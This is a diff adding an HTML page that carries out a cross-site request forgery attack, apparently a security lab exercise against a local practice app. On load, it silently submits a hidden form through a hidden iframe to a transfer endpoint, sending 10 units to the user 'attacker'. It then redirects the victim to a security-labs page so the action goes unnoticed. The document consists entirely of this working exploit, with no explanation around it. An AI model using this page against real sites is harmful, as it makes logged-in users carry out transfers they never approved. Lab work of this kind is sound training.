@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+  <html>
+  <body>
+    <form id="hiddenForm" name="hiddenForm" action="http://localhost:3000/post_transfer" method="post" target="hiddenFrame">
+      <input type="hidden" name="destination_username" value="attacker"/>
+      <input type="hidden" name="quantity" value="10"/>
+      <input type="submit" style="display:none">
+    </form>
+    <iframe name="hiddenFrame" src="#" style="display:none"></iframe>
+    <script>
+      window.onload = () => {
+        document.getElementById("hiddenForm").submit();
+        window.location = "https://seedsecuritylabs.org/labs.html";
+      };
+    </script>
+  </body>
+</html>
